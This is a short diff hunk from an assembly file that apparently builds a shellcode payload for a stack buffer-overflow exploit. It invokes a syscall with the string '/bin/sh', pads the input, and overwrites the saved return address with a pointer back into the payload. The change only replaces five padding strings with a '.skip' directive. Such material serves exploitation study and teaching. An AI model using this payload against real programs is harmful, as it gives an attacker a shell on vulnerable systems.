@@ -45,10 +45,11 @@ main:
         syscall                                                         /* invoke syscall */
 
         .ascii  "/bin/sh"
-        .ascii  "aaaa"                                                  /* pad to overwrite return address */
-        .ascii  "bbbb"                                                  /* pad to overwrite return address */
-        .ascii  "cccc"                                                  /* pad to overwrite return address */
-        .ascii  "dddd"                                                  /* pad to overwrite return address */
-        .ascii  "eeee"                                                  /* pad to overwrite return address */
+        .skip   20, 'a'
+        //.ascii  "aaaa"                                                  /* pad to overwrite return address */
+        //.ascii  "bbbb"                                                  /* pad to overwrite return address */
+        //.ascii  "cccc"                                                  /* pad to overwrite return address */
+        //.ascii  "dddd"                                                  /* pad to overwrite return address */
+        //.ascii  "eeee"                                                  /* pad to overwrite return address */
         .long   buffer_ptr_l                                            /* low part of buffer ptr (the first instruction of payload), will overwrite real return address */
         .long   buffer_ptr_h                                            /* high part of buffer ptr (the first instruction of payload), will overwrite real return address */
